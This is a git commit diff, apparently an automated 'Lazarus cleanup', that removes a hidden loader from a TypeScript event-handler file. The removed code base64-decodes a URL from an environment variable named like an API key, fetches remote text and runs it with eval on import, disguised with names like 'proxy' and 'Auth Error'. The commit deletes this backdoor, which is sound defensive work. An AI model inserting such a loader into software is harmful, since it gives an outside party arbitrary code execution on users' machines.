cc07bbee0678ddcaa9a3d35d482d6c8f93b95029
Okhuomon Ajayi <okhuomonajayi54@gmail.com>
2026-05-31 17:50:31 +0100

    Auto Lazarus cleanup 2026-05-31_17:50:31

--- src/EventHandlers.ts
+++ src/EventHandlers.ts
@@ -1,19 +1,5 @@
 import { Factory, Campaign, campaign, donation } from "generated"
 import { getCampaignDetails } from "./ViemFunctions"
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 
 Factory.CampaignCreated.handlerWithLoader({
     loader: async ({ event, context }) => {
